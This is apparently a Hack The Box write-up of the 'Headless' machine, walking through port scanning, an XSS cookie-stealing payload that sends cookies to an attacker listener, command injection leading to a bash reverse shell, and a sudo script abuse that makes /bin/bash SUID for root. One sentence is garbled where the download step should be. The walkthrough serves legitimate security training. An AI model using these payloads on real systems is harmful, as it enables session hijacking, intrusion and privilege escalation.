---
title: HTB-Headless
draft: false
tags:
  - htb
  - linux
  - sudo
  - xss
  - xss-cookie-stealing
  - cme
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/Headless.png)

## Information Gathering
### Rustscan

Rustscan discovers SSH and port 5000 open:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/headless]
└─$ sudo rustscan --addresses 10.10.11.8 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
<snip>
Host is up, received echo-reply ttl 63 (0.30s latency).
Scanned at 2024-05-15 00:28:08 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

## Enumeration
### HTTP - TCP 5000
HTTP is running on port 5000 and the websites is still under construction.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image.png)

**/support** pages shows form for contacting support:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-1.png)

Directory Bruteforcing via Feroxbuster discovers a new path: /dashboard:

`sudo feroxbuster -u http://10.10.11.8:5000 -C 404`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-2.png)

**/dashboard** access is unauthorized:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-3.png)

In order to gain access to the dashboard, we will first need to login to the application. we would be able to exploit vulnerabilities such as XSS from the support page. By exploiting XSS, we can steal admin user cookie, and use it to sign-in as the administrator. 

## XSS Cookie Stealing
We will follow this [article](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e)for XSS Cookie stealing.

Let's first intercept the request connection to /support form using Burp Suite:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-4.png)

Utilizing the following code, we will be able to obtain user's cookie and forward it to my listener:

```html
<script>var i=new Image(); i.src="http://10.10.14.14:8000/?cookie="+btoa(document.cookie);</script>
```

From some investigation, it seems like XSS works when the payload is placed under both **User-Agent** and **message** parameter as such below:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-5.png)

Running the request with payload, we can obtain cookie value:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-6.png)

Let's decrypt the cookie using base64:

`echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-7.png)

Using the discovered cookie, let's sign-in to dashboard:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-8.png)


Now we can successfully sign-in to Administrator Dashboard:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-9.png)

## RCE to Reverse Shell

After intercepting the request for "Generate Report" using Burp Suite, we can modify the "date" parameter and perform Remote Code Execution.

Below, it shows RCE command for `pwd` command via `&& pwd`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-10.png)

`pwd` command successfully runs:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-11.png)


### Reverse shell

Let's escalate this RCE vulnerability to Reverse shell.

We will first create file named **rev.sh** containing the following piece of code:

`bash -i >& /dev/tcp/10.10.14.14/1337 0>&1`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-12.png)

We will also prepare Python http server for transferring **rev.sh** over to the host machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-13.png)

Now, let's modify the date parameter so that it will download rev.sh from the attacking xt](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-14.png)


On our netcat listener, we get a shell as **dvir**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-15.png)

## Privesc: dvir to root



Running command `sudo -l` shows that **/usr/bin/syscheck** can be ran as the root:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-16.png)


This script uses an `if` statement to check if a process named "initdb.sh" is running using `pgrep`. If the process is not found (`! /usr/bin/pgrep -x "initdb.sh" &>/dev/null`), it prints a message indicating that the database service is not running and starts it by executing `./initdb.sh`.

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

Let's create initdb.sh and echo bash command in it as such:

```bash
echo "chmod u+s /bin/bash" > initdb.sh
chmod +x initdb.sh
```

We can obtain root privilege through `/bin/bash -p` command after running syscheck:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-17.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/headless/image-18.png)




## References
- https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e